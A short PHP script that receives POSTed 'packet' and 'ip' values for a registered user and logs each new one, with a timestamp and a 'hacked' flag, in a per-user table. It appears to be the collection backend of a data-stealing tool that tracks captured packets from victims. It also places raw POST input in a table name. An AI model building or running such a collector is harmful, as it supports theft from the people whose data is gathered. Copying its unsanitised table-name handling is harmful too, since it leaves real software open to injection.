<?php
  $servername = "localhost";
  $username   = "enter ur db user";
  $password   = "enter ur pass here";
  $dbname     = "enter ur db name here";

  $conn = mysqli_connect($servername, $username, $password, $dbname);
  if (!$conn) {
    die();
  }

  $user = $_POST["username"];
  $packet = $_POST["packet"];
  $ip = $_POST["ip"];
  $date = date("Y-m-d H:i:s");

  if(isset($user) && isset($packet)) {
    $usercheck = $conn->prepare("SELECT * FROM users WHERE username = ?");
    $usercheck->bind_param("s", $user);
    $usercheck->execute();
    $res = $usercheck->get_result();
    if (mysqli_num_rows($res) > 0)
    {
      $dupcheck = $conn->prepare("SELECT * FROM db$user WHERE packet = ?");
      $dupcheck->bind_param("s", $packet);
      $dupcheck->execute();
      $dup = $dupcheck->get_result();
      if (mysqli_num_rows($dup) > 0)
      {
        echo "duplicate";
      }
      else {
        $display = $conn->prepare("INSERT INTO db$user (packet, ip, date, hacked) VALUES (?, ?, ?, 0)");
        $display->bind_param("sss", $packet, $ip, $date);
        if ($display->execute())
        {
          echo "success";
        }
      }
    }
  }

?>
